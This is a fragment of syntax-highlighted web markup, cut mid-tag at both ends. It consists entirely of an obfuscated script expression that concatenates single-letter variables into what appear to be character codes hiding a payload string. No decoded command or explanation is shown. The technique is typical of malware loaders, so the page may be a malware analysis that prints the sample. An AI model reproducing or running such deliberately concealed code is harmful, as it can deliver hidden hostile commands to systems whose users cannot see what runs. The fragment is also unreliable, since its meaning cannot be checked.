class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$z</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$x</span><span class="hljs-variable">$o</span><span class="hljs-variable">$q</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span><span class="hljs-variable">$l</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span><span class="hljs-variable">$d</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span 